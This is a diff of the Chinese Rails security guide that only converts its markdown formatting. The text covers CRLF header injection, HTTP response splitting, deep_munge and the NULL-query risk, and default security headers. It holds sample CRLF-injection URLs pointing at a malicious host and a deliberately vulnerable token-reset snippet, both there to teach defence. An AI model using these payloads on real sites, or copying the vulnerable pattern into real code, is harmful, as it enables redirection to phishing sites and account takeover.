-~~~
+```
 http://www.yourapplication.com/controller/action?referer=http://www.malicious.tld%0d%0aX-Header:+Hi!
 http://www.yourapplication.com/controller/action?referer=path/at/your/app%0d%0aLocation:+http://www.malicious.tld
-~~~
+```
 
 注意，`%0d%0a` 是编码后的 `\r\n`，在 Ruby 中表示回车换行（CRLF）。上面的例子得到的 HTTP 报头如下所示，第二个 `Location` 覆盖了第一个：
 
-~~~
+```
 HTTP/1.1 302 Moved Temporarily
 (...)
 Location: http://www.malicious.tld
-~~~
+```
 
 报头注入就是在报头中注入 CRLF 字符。那么攻击者是怎么进行恶意重定向的呢？攻击者可以把用户重定向到钓鱼网站，要求再次登录，把登录密令发送给攻击者。或者可以利用浏览器的安全漏洞在网站中安装恶意软件。Rails 2.1.2 在 `redirect_to` 方法中转义了传给 `Location` 报头的值。使用用户的输入值构建报头时要手动进行转义。
 
@@ -939,7 +899,7 @@ Location: http://www.malicious.tld
 
 既然报头注入有可能发生，响应拆分也有可能发生。在 HTTP 响应中，报头后面跟着两个 CRLF，然后是真正的数据（HTML）。响应拆分的原理是在报头中插入两个 CRLF，后跟其他的响应，包含恶意 HTML。响应拆分示例：
 
-~~~
+```
 HTTP/1.1 302 Found [First standard 302 response]
 Date: Tue, 12 Apr 2005 22:09:07 GMT
 Location: Content-Type: text/html
@@ -954,23 +914,23 @@ Keep-Alive: timeout=15, max=100         shown as the redirected page]
 Connection: Keep-Alive
 Transfer-Encoding: chunked
 Content-Type: text/html
-~~~
+```
 
 某些情况下，拆分后的响应会把恶意 HTML 显示给用户。不过这只会在 `Keep-Alive` 连接中发生，大多数浏览器都使用一次性连接。但你不能依赖这一点。不管怎样这都是个严重的隐患，你需要升级到 Rails 最新版，消除报头注入风险（因此也就避免了响应拆分）。
 
-## 生成的不安全查询
+生成的不安全查询
+--------------
 
 根据 Active Record 处理参数的方式以及 Rack 解析请求参数的方式，攻击者可以通过 `WHERE IS NULL` 子句发起异常数据库查询。为了应对这种安全隐患（[CVE-2012-2660](https://groups.google.com/forum/#!searchin/rubyonrails-security/deep_munge/rubyonrails-security/8SA-M3as7A8/Mr9fi9X4kNgJ)，[CVE-2012-2694](https://groups.google.com/forum/#!searchin/rubyonrails-security/deep_munge/rubyonrails-security/jILZ34tAHF4/7x0hLH-o0-IJ) 和 [CVE-2013-0155](https://groups.google.com/forum/#!searchin/rubyonrails-security/CVE-2012-2660/rubyonrails-security/c7jT-EeN9eI/L0u4e87zYGMJ)），Rails 加入了 `deep_munge` 方法，增加安全性。
 
 如果不使用 `deep_munge` 方法，下面的代码有被攻击的风险：
 
-{:lang="ruby"}
-~~~
+```ruby
 unless params[:token].nil?
   user = User.find_by_token(params[:token])
   user.reset_password!
 end
-~~~
+```
 
 如果 `params[:token]` 的值是 `[]`、`[nil]`、`[nil, nil, ...]` 或 `['foo', nil]` 之一，会跳过 `nil?` 检查，但 `WHERE` 子句 `IS NULL` 或 `IN ('foo', NULL)` 还是会添加到 SQL 查询中。
 
@@ -986,40 +946,37 @@ end
 
 如果知道这种风险，也知道如何处理，可以通过设置禁用 `deep_munge`，使用原来的处理方式：
 
-{:lang="ruby"}
-~~~
+```ruby
 config.action_dispatch.perform_deep_munge = false
-~~~
+```
 
-## 默认报头
+默认报头
+---------
 
 Rails 程序返回的每个 HTTP 响应都包含下面这些默认的安全报头：
 
-{:lang="ruby"}
-~~~
+```ruby
 config.action_dispatch.default_headers = {
   'X-Frame-Options' => 'SAMEORIGIN',
   'X-XSS-Protection' => '1; mode=block',
   'X-Content-Type-Options' => 'nosniff'
 }
-~~~
+```
 
 默认的报头可在文件 `config/application.rb` 中设置：
 
-{:lang="ruby"}
-~~~
+```ruby
 config.action_dispatch.default_headers = {
   'Header-Name' => 'Header-Value',
   'X-Frame-Options' => 'DENY'
 }
-~~~
+```
 
 当然也可删除默认报头：
 
-{:lang="ruby"}
-~~~
+```ruby
 config.action_dispatch.default_headers.clear
-~~~
+```
 
 下面是一些常用的报头：
 
@@ -1030,11 +987,13 @@ config.action_dispatch.default_headers.clear
 * `Access-Control-Allow-Origin`：设置哪些网站可以不沿用同源原则，发送跨域请求。
 * `Strict-Transport-Security`：设置是否强制浏览器使用[安全连接](http://en.wikipedia.org/wiki/HTTP_Strict_Transport_Security)访问网站。
 
-## 环境相关的安全问题
+环境相关的安全问题
+---------------
 
 增加程序代码和环境安全性的话题已经超出了本文范围。但记住要保护好数据库设置（`config/database.yml`）以及服务器端密令（`config/secrets.yml`）。更进一步，为了安全，这两个文件以及其他包含敏感数据的文件还可使用环境专用版本。
 
-## 其他资源
+其他资源
+-------
 
 安全漏洞层出不穷，所以一定要了解最新信息，新的安全漏洞可能会导致灾难性的后果。安全相关的信息可从下面的网站获取：
 
